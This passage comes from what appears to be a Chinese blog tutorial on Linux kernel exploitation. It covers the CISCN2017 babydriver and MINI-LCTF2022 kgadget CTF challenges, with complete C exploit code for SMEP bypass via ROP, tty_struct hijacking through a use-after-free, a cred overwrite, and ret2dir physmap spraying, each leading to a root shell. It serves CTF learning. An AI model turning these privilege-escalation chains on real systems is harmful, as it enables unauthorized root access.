class="hljs-number">0xffffffff8106669c</span> + offset;<span class="hljs-comment">// mov rax, cr4; test ah, 0x20; jne 0x2666aa; add rsp, 8; pop rbx; ret;</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset;<span class="hljs-comment">// pop rdi; ret;</span><br>rop[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff8102b45b</span> + offset;<span class="hljs-comment">// and rax, rdi; ret;</span><br><br>rop[i++] = <span class="hljs-number">0xffffffff81002515</span> + offset;<span class="hljs-comment">// mov cr4, rax; push rcx; popfq; ret;</span><br><br>rop[i++] = (<span class="hljs-type">size_t</span>)get_root;<br><br>rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>rop[i++] = <span class="hljs-number">0</span>;<br><br>rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br><br>rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br><br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp;<br>rop[i++] = user_ss;<br><br>write(fd, rop, <span class="hljs-number">0x800</span>);<br>core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功提权到root</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/bypassgetroot.png" alt="bypassgetroot"></p><h2 id="03-kernel-uaf">03.kernel uaf</h2><h3 id="CISCN2017-babydriver">CISCN2017 - babydriver</h3><h4 id="0x01程序分析">0x01程序分析</h4><p>解压下cpio,顺便用extract-vmlinux解压bzImage出vmlinux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir core<br>cd core<br>mv ../rootfs.cpio rootfs.cpio.gz<br>gunzip ./rootfs.cpio.gz<br>cpio -idm &lt; ./rootfs.cpio<br>cp ./rootfs.cpio ../<br>cd ..<br>chmod +777 extract-vmlinux<br>./extract-vmlinux ./bzImage &gt; vmlinux<br>chmod +777 vmlinux<br><br></code></pre></td></tr></table></figure><h5 id="1-查看init：">1.查看init：</h5><p>可以看到载入了LKM(可加载内核模块)babydriver.ko</p><p>漏洞基本出在这</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2017babydriver1.png" alt="2017babydriver1"></p><h5 id="2-查看保护">2.查看保护</h5><p>无canary，pie</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5.png" alt="5"></p><h5 id="3-ida分析babydriver-ko">3.ida分析babydriver.ko</h5><h6 id="一-两个结构体">一.两个结构体</h6><p>可以看看<a href="https://beafb1b1.github.io/kernel/ciscn_2017_babydriver_UAF/#_1">CISCN2017 babydriver(UAF) - b1b1’s share (beafb1b1.github.io)</a>分析的真不错</p><p>ida shift+F9可以找到如下结构</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6.png" alt="6"></p><p>我们点击上图中的XREF，然后ctrl+x查看那个fops的交叉引用</p><p>发现是这个函数</p><p><code>cdev_init(&amp;cdev_0, &amp;fops);</code></p><p>我们点开这个<code>&amp;fops</code></p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7.png" alt="7"></p><p>反正实际是这个对应关系</p><blockquote><p>read:babyread</p><p>write:babywrite</p><p>unlocked_ioctl:babyioctl</p><p>open:babyopen</p></blockquote><p><strong>还有另一个结构:{buf,buf_len}</strong></p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2.png" alt="2"></p><h6 id="二-一些函数">二.一些函数</h6><p><strong>程序开始，结束会自动进入babydriver_init，babydriver_exit，</strong></p><p><strong>对设备文件使用read或write会调用babyread,babywrite函数</strong></p><p>就是在device_buf指向的内存读写device_buf_len长度</p><p><strong>对设备文件使用open会调用babyopen函数</strong></p><p>open的时候都会通过kmalloc申请一块64字节大小的内存，并把指针存储在bss上的全局变量babydev_struct的device_buf，同时更新babydev_struct的device_buf_len为64。</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3.png" alt="3"></p><p><strong>对设备文件使用ioctl会调用babyioctl函数</strong></p><p>申请一个我们指定长度的内存，并把指针存储在bss上的全局变量babydev_struct的device_buf，同时更新babydev_struct的device_buf_len为我们指定的长度</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/4.png" alt="4"></p><h5 id="4-漏洞点">4.漏洞点</h5><p>存在UAF漏洞，babydev_struct是全局变量，我们如果open两次，就是两个指向同一个地址，我们release掉一个，然后这个指针并未置为null，还有一个还在使用，就能uaf了</p><h4 id="0x02解法1：">0x02解法1：</h4><p><strong>大体步骤：UAF+2*stack migitation+bypass-SMEP+ret2usr</strong></p><p>没有开启kalsr，且普通用户能直接读/proc/kallsyms</p><p>但是开启了smep，需要rop关掉它</p><h5 id="1-找gadget">1.找gadget</h5><p>我们先ROPgadget把gadget跑出来</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">time</span> ROPgadget <span class="hljs-comment">--binary ./vmlinux &gt; g2</span><br></code></pre></td></tr></table></figure><p>ROPgadget一下就出来了，ropper跑半天，卡死了</p><p><strong>但是ROPgadget 获得的代码片段中有时候没有iretq和sysretq，我这题就没有，两种解决办法：</strong></p><ol><li>python 进行iretq编码匹配</li><li>ida 解析vmlinux 查找iretq指令</li></ol><p>我这里选择第二种，ida打开vmlinux，alt+t，找iretq</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8.png" alt="8"></p><p>注意<strong>mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</strong>这个指令</p><p>\xc3就是ret的汇编，所以其实这里能执行的话， jmp 0xffffffff8181bf7e相当于ret</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/10.png" alt="10"></p><h5 id="2-具体步骤">2.具体步骤</h5><p>open打开<code>/dev/ptmx</code>设备时,就会创建一个 <code>tty_struct</code> 结构体，这个<code>tty_struct</code> 结构体里存放着tty_operations指针，</p><blockquote><p>那么我们不难想到的是我们可以通过 UAF 劫持 <code>/dev/ptmx</code> 这个设备的 <code>tty_struct</code> 结构体与其内部的 <code>tty_operations</code> 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针</p></blockquote><p>就是当使用write函数时，会调用tty_struct的tty_operations里的write指针</p><p>(tty_operations在tty_struct的下标3处)</p><p>(对应write的指针在tty_operations下标7处)</p><p>因为显然没og这种一个地址达成目标，所以要迁移到栈上</p><p>在调用<code>tty_operations-&gt;write</code>时，<strong>其rax寄存器中存放的便是tty_operations结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头</p><p>所以第一次迁移rsp就是利用 程序运行到那时rax保存的fake_operations开头地址</p><p>我们用pop rax在fake_operations开头布置好rax为rop链的地址，第二次迁移rsp到rop链，就能执行我们的rop链了</p><p>rop链的内容是(关闭smep-&gt;ret2usr-&gt;内核态get_root-&gt;生成shell-&gt;着陆回用户态)</p><h5 id="3-exp">3.exp</h5><p>值得注意的是遍历符号表会找到好几个commit_creds和prepare_kernel_cred_addr，我们找到这两个直接退出遍历即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc new_exp.c -static -masm=intel -g -o new_exp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /proc/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(commit_creds_addr&amp;&amp;prepare_kernel_cred_addr)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds_addr;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-comment">//sleep(10);</span><br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">13</span>],p=<span class="hljs-number">0</span>;<br>    rop[p++]= <span class="hljs-number">0xffffffff810d238d</span>; <span class="hljs-comment">//pop rdi ; ret</span><br>    rop[p++]= <span class="hljs-number">0x6f0</span>;<br>    rop[p++]= <span class="hljs-number">0xffffffff81004d80</span>; <span class="hljs-comment">//mov cr4, rdi ; pop rbp ; ret</span><br>    rop[p++]= <span class="hljs-number">0</span>;<br>    rop[p++]= getRootPrivilige;<br>    rop[p++]= <span class="hljs-number">0xffffffff81063694</span>; <span class="hljs-comment">//swapgs ; pop rbp ; ret</span><br>    rop[p++]= <span class="hljs-number">0</span>; <br>    rop[p++]= <span class="hljs-number">0xFFFFFFFF8181A797</span>;<span class="hljs-comment">//iretq ;ret</span><br>    rop[p++]= spawn_shell;<span class="hljs-comment">//rip</span><br>    rop[p++] = user_cs;<br>    rop[p++] = user_rflags;<br>    rop[p++] = user_sp;<br>    rop[p++] = user_ss;<br><br><span class="hljs-type">size_t</span> fake_op[<span class="hljs-number">0x10</span>];<br>fake_op[<span class="hljs-number">0</span>]=<span class="hljs-number">0xffffffff8100ce6e</span>; <span class="hljs-comment">// pop rax ; ret</span><br>fake_op[<span class="hljs-number">1</span>]=rop;<br>fake_op[<span class="hljs-number">2</span>]=<span class="hljs-number">0xffffffff8181bfc5</span>; <span class="hljs-comment">//mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</span><br>fake_op[<span class="hljs-number">7</span>]=<span class="hljs-number">0xffffffff8181bfc5</span>; <span class="hljs-comment">//mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</span><br><br><span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>); <span class="hljs-comment">//tty_struct size 0x2e0</span><br>close(fd1);<br><br><span class="hljs-type">size_t</span> fake_tty[<span class="hljs-number">0x20</span>];<br><span class="hljs-type">int</span> fd3=open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>,<span class="hljs-number">2</span>);<br><br>read(fd2,fake_tty,<span class="hljs-number">0x20</span>);<br>fake_tty[<span class="hljs-number">3</span>]=fake_op;<br>write(fd2, fake_tty, <span class="hljs-number">0x20</span>);<br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x8</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>write(fd3, buf, <span class="hljs-number">0x8</span>);<span class="hljs-comment">//trigger</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>成功提权</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/9.png" alt="9"></p><h4 id="0x03解法2：">0x03解法2：</h4><p><strong>大体步骤：UAF-&gt;修改cred</strong></p><p>新版本内核就不能用过去的简单做法了，因为：</p><blockquote><p>新进程的cred结构体会有一个单独的区域进行申请，因此UAF漏洞无法利用成功，这种新的特征叫做lockdown</p></blockquote><p>此外我的gcc编译出来的打不通(用wiki里给的打的通，也许是编译器问题)，懒得整了</p><h5 id="1-exp：">1.exp：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc uaf.c -static -o uaf</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> fd1=open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-type">int</span> fd2=open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>,<span class="hljs-number">2</span>);<br><br>    ioctl(fd1,<span class="hljs-number">0x10001</span>,<span class="hljs-number">0xa8</span>);<br>    close(fd1);<br>    <br>    <span class="hljs-type">int</span> pid=fork();<br>    <span class="hljs-keyword">if</span>(pid==<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-type">char</span> zeros[<span class="hljs-number">40</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        write(fd2,zeros,<span class="hljs-number">32</span>);<br>    <br>        <span class="hljs-keyword">if</span>(getuid()==<span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]get root&quot;</span>);<br>            system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>        &#125;<br>    &#125;<br>    close(fd2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="04-ret2dir">04.ret2dir</h2><p>ret2dir即 return to direct mapping area，<strong>在内核空间中都能通过这块内存区域访问到</strong>，我们只需要在用户空间布置恶意数据，之后再在内核空间的这块区域中找到我们的用户空间数据对应的内核空间地址即可，这便是 <code>ret2dir</code> ——<strong>通过内核空间地址访问到用户空间数据</strong></p><h3 id="MINI-LCTF2022-kgadget">MINI-LCTF2022 - kgadget</h3><h4 id="0x01程序分析-2">0x01程序分析</h4><h5 id="1-保护查看">1.保护查看</h5><p>开启了smep/smap，没开kaslr，可以看到这里pti=on，其实是开启了KPTI，所以不能关闭smep来ret2usr</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684501618947.png" alt="1"></p><h5 id="2-查看init">2.查看init</h5><p><code>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</code></p><p>非特权用户不能使用dmesg查看来自内核日志缓冲区的消息</p><p><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code></p><p>非特权用户都无法读取内核符号地址</p><p><code>chmod 400 /flag</code></p><p>只有root可以读flag</p><p>载入了LKM kgadget.ko，显然重点关注这个</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684501618947.png" alt="2"></p><h5 id="3-分析kgadget-ko">3.分析kgadget.ko</h5><h6 id="一-保护">一.保护</h6><p>开启了canary，nx</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3-1684501618947.png" alt="3"></p><h6 id="二-函数">二.函数</h6><p>就重点分析ioctl</p><p>我们第二个参数是114514的话，会解析第三个参数指针执行</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/4-1684501618947.png" alt="4"></p><p>前面qmemcpy这段我们不好理解做了啥，我们看汇编</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/5-1684501618947.png" alt="5"></p><p>可以看到这边[rax-0xa8]是pt_regs，可以看到就是把pt_regs的r15,r14,r13,r12,rbp,r11,r10赋值“attrnba3”</p><p>最后call rbx,rbx已经是第三个参数了，也就是解析第三个参数指针执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> orig_rax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="0x02解题步骤">0x02解题步骤</h4><p><strong>ret2dir + physmap spray</strong></p><p>攻击方法就是return to direct mapping area（线性映射区），利用内核线性映射区对整个物理地址空间的映射，在内核空间上的地址访问到用户空间的数据。</p><h5 id="1-申请内存">1.申请内存</h5><p><code>mmap(NULL, sysconf(_SC_PAGESIZE), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</code></p><p>（mmap如此申请的话，一个页大小，内存可读可写，匿名映射）</p><p>我们以一个页的大小来申请内存，后续要往里面写入payload，用physmap spray手法， mmap 喷射大量的物理内存写入同样的 payload(rop链)</p><blockquote><p><strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个线性映射区上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong>，这种攻击手法也称为 <code>physmap spray</code></p></blockquote><h5 id="2-在内存中构造ROP链">2.在内存中构造ROP链</h5><p>由于开启了KPTI，无法ret2usr，要rop出commit_creds(prepare_kernel_cred(0))又缺一个必要的<code>mov rdi,rax;ret</code>的gadget，其实也可能有</p><p>（如果jmp的地址指向ret的话就有了，不过太多懒得找，这里采取另一种更简便的rop方法）</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/6-1684501618947.png" alt="6"></p><p>rop出<code>commit_creds(init_cred)</code>,返回用户态另选择<code>swapgs_restore_regs_and_return_to_usermode</code>这个gadget，这是一个保存pt_regs结构并且返回到用户态的函数的地址</p><p>(用swapgs_restore_regs_and_return_to_usermode是为了通过切换页表通过KPTI保护)</p><p>（地址我们可以通过设置init为root 来cat出来）</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/7-1684501618947.png" alt="7"></p><p>我们+27偏移跳过前面的pop<img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/8-1684501618948.png" alt="8"></p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/9-1684501618947.png" alt="9"></p><p>所以rop这么连</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 